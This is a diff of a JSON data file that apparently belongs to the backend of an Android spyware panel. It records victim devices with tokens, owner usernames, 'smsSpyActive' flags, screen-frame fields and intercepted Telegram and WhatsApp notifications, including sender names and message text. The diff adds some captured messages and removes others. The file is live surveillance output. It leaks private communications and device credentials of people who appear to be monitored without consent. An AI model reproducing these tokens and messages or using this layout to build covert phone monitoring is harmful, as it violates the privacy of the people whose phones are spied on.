@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776775781030,
+    "lastSeen": 1776775808056,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776775781688,
+    "lastSeen": 1776775808748,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776775782320,
+    "lastSeen": 1776775809361,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Fastcal Shop Nokos Monitor Harga",
+        "content": "📈 UPDATE HARGA WHATSAPP\n\n📍 Negara: Indonesia\n🕐 Waktu: 21/4/2026, 19.50.07\n📊 Total Server: 45\n📦 Stok Total: 3429\n\n━━━━━━━━━━━━━━━━━━━\n\n🔴 HARGA NAIK!\n\nServer 19\n💰 Rp 3.150 → Rp 3.750\n📈 Naik Rp 600 (19%)\n📊 Rate: 17.91% | 📦 Stok: 3\n\nServer 20\n💰 Rp 3.150 → Rp 3.800\n📈 Naik Rp 650 (20.6%)\n📊 Rate: 100% | 📦 Stok: 3\n\nServer 21\n💰 Rp 3.150 → Rp 3.850\n📈 Naik Rp 700 (22.2%)\n📊 Rate: 14.79% | 📦 Stok: 3\n\nServer 22\n💰 Rp 3.200 → Rp 3.900\n📈 Naik Rp 700 (21.9%)\n📊 Rate: 20.32% | 📦 Stok: 4\n\nServer 23\n💰 Rp 3.200 → Rp 3.950\n📈 Naik Rp 750 (23.4%)\n📊 Rate: 100% | 📦 …",
+        "time": "21/04 19:50",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775809756
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16751 pesan baru dari 117 obrolan",
+        "time": "21/04 19:50",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775809671
+      },
       {
         "appName": "Telegram",
         "sender": "GB PANEL PRIVATE WANZ: WantidCpanel_bot",
@@ -14386,22 +14402,6 @@
         "time": "21/04 19:09",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776773382113
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Nanat",
-        "content": "Berdering…",
-        "time": "21/04 19:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776773381945
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Nanat",
-        "content": "Berdering…",
-        "time": "21/04 19:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776773380843
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776775782093,
+    "lastSeen": 1776775807353,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
